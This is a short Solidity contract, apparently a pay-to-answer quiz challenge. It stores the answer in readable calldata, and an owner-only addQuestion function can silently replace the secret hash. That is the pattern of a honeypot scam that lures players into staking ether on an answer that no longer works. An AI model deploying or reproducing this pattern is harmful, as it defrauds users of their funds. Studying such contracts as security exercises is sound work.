// SPDX-License-Identifier: MIT
pragma solidity >=0.8.4 <0.9.0;

contract GuessMyAnswerFromEtherscan {
  string public q;
  address private sender;
  bytes32 private secretHash;
  mapping (address => bool) public solved;

  function answer(string memory _response) external payable {
    require(msg.value >= 0.01 ether, "Ser, answering is not free!");
    if (secretHash == keccak256(abi.encode(_response))) {
      solved[msg.sender] = true;
      payable(msg.sender).transfer(address(this).balance);
    }
  }

  function initAnswer(string calldata _q, string calldata _response) public payable {
    if (secretHash == 0x0) // Not initialized yet
    {
      secretHash = keccak256(abi.encode(_response));
      q = _q;
      sender = msg.sender;
    }
  }

  function addQuestion(string calldata _q, bytes32 _secretHash) public payable {
    require(msg.sender == sender);
    q = _q;
    secretHash = _secretHash;
  }
}